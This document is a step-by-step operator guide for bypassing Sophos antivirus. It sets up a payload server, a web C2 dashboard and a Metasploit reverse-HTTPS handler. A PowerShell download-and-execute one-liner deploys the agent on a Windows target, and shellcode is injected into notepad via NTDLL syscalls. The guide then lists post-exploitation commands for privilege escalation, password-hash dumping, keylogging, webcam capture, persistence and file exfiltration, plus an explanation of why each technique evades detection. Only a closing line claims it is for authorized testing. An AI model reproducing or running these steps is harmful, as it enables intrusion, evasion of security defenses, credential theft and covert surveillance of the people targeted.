# SOPHOS BYPASS - QUICK START GUIDE

## Step-by-Step Instructions

### STEP 1: Start HTTP Server (Terminal 1)
```bash
cd /Users/cyberxor/cyber_c2/sophos_bypass
python3 -m http.server 9000
```
**Purpose:** Hosts PowerShell scripts and payloads

---

### STEP 2: Start BITS C2 Server (Terminal 2)
```bash
cd /Users/cyberxor/cyber_c2/sophos_bypass
python3 bits_c2_web.py
```
**Access Dashboard:** http://localhost:8080

---

### STEP 3: Start Metasploit Handler (Terminal 3)
```bash
msfconsole -q -x "use exploit/multi/handler; \
set payload windows/x64/meterpreter/reverse_https; \
set LHOST 192.168.1.179; \
set LPORT 4444; \
set HandlerSSLCert /Users/cyberxor/cyber_c2/certs/server.pem; \
set ExitOnSession false; \
exploit -j"
```
**What it does:** Listens for Meterpreter connection on port 4444

---

### STEP 4: Deploy Agent on Windows Target
**Open PowerShell on Windows and run:**
```powershell
iex (iwr -UseBasicParsing http://192.168.1.179:9000/enhanced_agent.ps1)
```
**Result:** Agent connects to C2 dashboard (refresh http://localhost:8080)

---

### STEP 5: Generate Meterpreter Payload (Terminal 4)
```bash
cd /Users/cyberxor/cyber_c2/sophos_bypass
python3 generate_payload.py 192.168.1.179 4444
```
**Copy the base64 shellcode** - you'll need it later (or it's saved in shellcode.txt)

---

### STEP 6: Find Target Process
**In C2 Web Dashboard (http://localhost:8080), send command:**
```powershell
Get-Process notepad | Select-Object Id,ProcessName
```

**If no notepad is running, first run:**
```powershell
Start-Process notepad
```

**Note the PID** (e.g., 17216)

---

### STEP 7: Inject Shellcode into Process
**In C2 Web Dashboard, send command:**
```powershell
iex (iwr http://192.168.1.179:9000/syscall_inject.ps1 -UseBasicParsing)
```

**Wait 5-10 seconds...**

---

### STEP 8: Get Meterpreter Session
**In Metasploit terminal (Terminal 3):**
```bash
# Bring MSF to foreground if needed
fg

# Check sessions
sessions

# Interact with session
sessions -i 1
```

**You should now have Meterpreter!**

---

## Post-Exploitation Commands

### Basic Info
```bash
sysinfo                    # System information
getuid                     # Current user
pwd                        # Current directory
ls                         # List files
```

### Privilege Escalation
```bash
getsystem                  # Attempt privilege escalation
getprivs                   # Show privileges
```

### Credential Harvesting
```bash
hashdump                   # Dump password hashes (requires SYSTEM)
```

### Surveillance
```bash
screenshot                 # Take screenshot
keyscan_start             # Start keylogger
keyscan_dump              # View captured keystrokes
webcam_snap               # Take webcam photo
```

### Process Migration (Important!)
```bash
ps                         # List all processes
migrate 12008             # Migrate to explorer.exe (more stable)
```

### Persistence
```bash
run persistence -X -i 10 -p 4444 -r 192.168.1.179
```

### File Operations
```bash
download C:\\path\\to\\file.txt
upload /local/file.txt C:\\Windows\\Temp\\
```

---

## Troubleshooting

### Agent not connecting?
- Check HTTP server is running on port 9000
- Check BITS C2 server is running on port 8080
- Verify Windows can reach 192.168.1.179

### Injection failed?
- Make sure notepad is running
- Try a different process (not explorer.exe)
- Regenerate payload with fresh shellcode

### Meterpreter not connecting?
- Check MSF handler is listening on port 4444
- Verify firewall allows incoming HTTPS on 4444
- Check shellcode.txt has valid base64 payload

### Session dies immediately?
- Migrate to explorer.exe: `migrate 12008`
- Don't close the notepad window
- Use a more stable process

---

## Quick Recovery

If something breaks, restart everything:

```bash
# Terminal 1
pkill -f "http.server 9000"
cd /Users/cyberxor/cyber_c2/sophos_bypass && python3 -m http.server 9000 &

# Terminal 2
pkill -f bits_c2_web.py
python3 bits_c2_web.py &

# Terminal 3
# Ctrl+C to stop MSF, then restart handler
```

---

## Why This Works

**Sophos Detection Points:**
1. ❌ Custom socket() calls → We use Invoke-RestMethod
2. ❌ kernel32.dll hooks → We use ntdll.dll syscalls
3. ❌ File-based payloads → We execute in-memory
4. ❌ Known MSF signatures → Base64 encoded + syscalls
5. ❌ Compiled executables → Pure PowerShell

**Bypass Techniques:**
1. ✅ Living Off The Land (LOTL) - PowerShell
2. ✅ NTDLL syscalls (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx)
3. ✅ In-memory execution only
4. ✅ HTTP/HTTPS protocol (looks like normal web traffic)
5. ✅ Process injection into legitimate process

---

## Key Files

- **bits_c2_web.py** - Web C2 server with dashboard
- **enhanced_agent.ps1** - PowerShell agent with injection support
- **syscall_inject.ps1** - NTDLL syscall injector (THE KEY!)
- **generate_payload.py** - Creates Meterpreter shellcode
- **shellcode.txt** - Base64 encoded Meterpreter payload

---

## Success Indicators

1. ✅ C2 Dashboard shows connected agent
2. ✅ Commands execute and return results
3. ✅ MSF handler shows "Meterpreter session opened"
4. ✅ `sessions` command shows active session
5. ✅ Can interact with Meterpreter shell

---

**Remember:** This is for authorized security testing only!
